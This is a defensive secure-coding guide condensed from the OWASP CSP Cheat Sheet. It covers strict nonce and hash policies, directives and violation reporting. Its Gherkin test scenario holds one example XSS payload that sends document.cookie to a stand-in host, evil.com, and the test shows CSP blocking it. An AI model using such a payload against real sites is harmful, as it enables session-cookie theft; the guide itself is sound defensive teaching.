# Content Security Policy

## What it is

How to deploy a Content Security Policy (CSP): a set of rules the server sends in a header that tells the
browser which scripts, styles, frames, and other resources a page may load and run. This is the per-sheet
guidance from the OWASP Content Security Policy Cheat Sheet, condensed to the controls that hold and the attack
they stop.

## The attack it stops

CSP is a second layer against injection, mainly Cross-Site Scripting (XSS). If an attacker manages to inject
markup into your page, a good policy stops the payload from doing damage: the browser refuses to run inline
`<script>` blocks, scripts pulled from an attacker's server, and text-to-JavaScript such as `eval`, and it
blocks forms that post to an off-site collector and legacy plugin objects. The same policy's `frame-ancestors`
directive also stops framing-based attacks such as clickjacking and some cross-site leaks.

## Controls

In the cheat sheet's order of preference:

1. **Treat CSP as a second layer, not your only XSS defense.** CSP limits what a page can load and run, which
   blunts exploitation, but you must still prevent XSS at the source (see the XSS Prevention Cheat Sheet) and
   layer CSP on top. Even a fully static site can use CSP to enforce Subresource Integrity on third-party
   scripts.
2. **Deliver the policy by HTTP response header, on every response.** The `Content-Security-Policy` response
   header is preferred and supports the full feature set; send it with all responses, not just the home page.
   Use `Content-Security-Policy-Report-Only` to ship a non-enforced ("fail open") policy that only reports
   violations (via `report-to` or `report-uri`) as a safe precursor to enforcing, and you can run an enforced
   policy and a report-only policy at the same time. A `<meta http-equiv="Content-Security-Policy">` tag is a
   fallback for when you cannot set headers (for example behind a CDN), but it cannot do `frame-ancestors`,
   `sandbox`, or a reporting endpoint. Never use the obsolete `X-Content-Security-Policy` or `X-WebKit-CSP`
   headers.
3. **Prefer a Strict CSP over an allowlist.** Allowlist policies are hard to get right and are frequently
   bypassed; a strict policy is easier to deploy and harder to defeat. Build a strict policy with nonces or
   hashes:
   - **Nonce-based:** generate a fresh, single-use random value per response, add it to the policy as
     `'nonce-{RANDOM}'`, and stamp that same nonce on each legitimate `<script>`. This needs server-rendered
     (non-static) HTML and a real templating engine; do not use middleware that blindly adds a nonce to every
     script tag, because an injected script would receive it too.
   - **Hash-based:** allow a specific inline script with `script-src 'sha256-...'`. The browser reports the
     expected hash on violation. Any change inside the script (even whitespace) changes the hash and blocks it.
   - **`strict-dynamic`:** combine it with a nonce or hash so scripts created by an already-trusted script are
     trusted too, without tagging each one. It is a CSP Level 3 feature with wide modern support.
4. **Keep the dangerous surfaces closed explicitly.** CSP stops XSS by refusing inline scripts, remote scripts
   from untrusted origins, text-to-JavaScript such as `eval`, off-site form posts (phishing forms), and legacy
   plugin objects. Keep `'unsafe-inline'` and `'unsafe-eval'` out of a strict policy.
5. **Use the right directive for each resource type.** Fetch directives name trusted sources and fall back to
   `default-src` when unspecified: `script-src` (plus `script-src-elem`, and `script-src-attr` for event
   handlers), `style-src` (plus `style-src-elem` and `style-src-attr`), `connect-src` (fetch, XHR, eventsource,
   beacon, websockets), `img-src`, `font-src`, `media-src`, `manifest-src`, `child-src` (nested contexts and
   workers), and `object-src`. Do not rely on `prefetch-src` (removed from CSP Level 3 and ignored). Document
   directives: `base-uri` restricts the `<base>` element, and `sandbox` restricts page actions such as form
   submission (header-only); do not rely on the removed `plugin-types`, use `object-src 'none'` instead.
   Navigation directives: `form-action` limits where forms may submit, and `frame-ancestors` limits who may
   frame the page (header-only, ignored in a `<meta>` tag, no `default-src` fallback, and it obsoletes
   `X-Frame-Options`). The source keywords are `'none'` (nothing matches), `'self'` (same origin, scheme, and
   port), `'unsafe-inline'`, and `'unsafe-eval'`.
6. **Wire up violation reporting.** Use `report-to` (CSP Level 3, paired with a `Reporting-Endpoints` response
   header) as the current mechanism, and declare the deprecated `report-uri` alongside it for older browsers
   until you no longer need them.
7. **Start from a known-good policy and tighten.** A strict starting policy is
   `script-src 'nonce-{RANDOM}' 'strict-dynamic'; object-src 'none'; base-uri 'none';` (or the
   `'sha256-{HASHED_INLINE_SCRIPT}'` variant). If a strict policy is not yet possible, a basic same-origin
   policy still cuts attack surface: `default-src 'self'; frame-ancestors 'self'; form-action 'self';`,
   tightened to `default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self';
   frame-ancestors 'self'; form-action 'self';`. To block framing use `frame-ancestors 'none'` (or `'self'`, or
   a trusted host). When migrating from HTTP to HTTPS, add `upgrade-insecure-requests`.
8. **Refactor inline code so a strict policy can work.** With `default-src` or a `script-src*` directive active,
   inline scripts and inline event handlers (such as `onclick`) are blocked. Move inline script into an
   external file loaded with `<script src>`, and replace inline handlers with `addEventListener`.

## @security scenario

```gherkin
@security @owasp:csp @usecase:block-injected-inline-script
Scenario: A strict nonce-based CSP blocks an injected inline script
  Given every response sends "Content-Security-Policy: script-src 'nonce-{RANDOM}' 'strict-dynamic'; object-src 'none'; base-uri 'none'"
  And each legitimate script tag carries the per-response nonce
  When an attacker injects "<script>document.location='https://evil.com/'+document.cookie</script>" into a rendered field
  Then the browser refuses to execute the injected script because it has no valid nonce
  And a violation report is sent to the configured reporting endpoint
```

This scenario is the canonical copy. When you apply this sheet to real code, add it to the repo's shared
feature-file index (see `bdd-comprehensive-testing`, "Storing BDD scenarios permanently") and wire it into CI
(its "CI/CD wiring") so it runs as a blocking autotest alongside every other Gherkin scenario.

## The real guarantee

The structural control is that a strict `script-src` lets the browser run only scripts that carry the current
response's nonce (or a matching hash), so any script an attacker injects has no valid nonce and never executes,
no matter where the injection lands. The `@security` scenario proves one injected inline script is blocked; the
nonce-gated policy sent on every response is what makes every injected script fail. Mind the scope of the
guarantee: CSP is the second layer. It makes XSS far harder to exploit but does not remove the underlying flaw,
so it rides on top of proper output encoding, not instead of it.

## Sources

- OWASP Content Security Policy Cheat Sheet (<https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html>, retrieved 2026-10-11): CSP as defense in depth for XSS and framing, the three delivery mechanisms (header, report-only, meta tag) and the obsolete headers to avoid, strict versus allowlist policies, nonces, hashes, and `strict-dynamic`, the fetch, document, navigation, and reporting directives and the source keywords, sample strict and basic policies, `upgrade-insecure-requests`, and refactoring inline code. `[documented]`
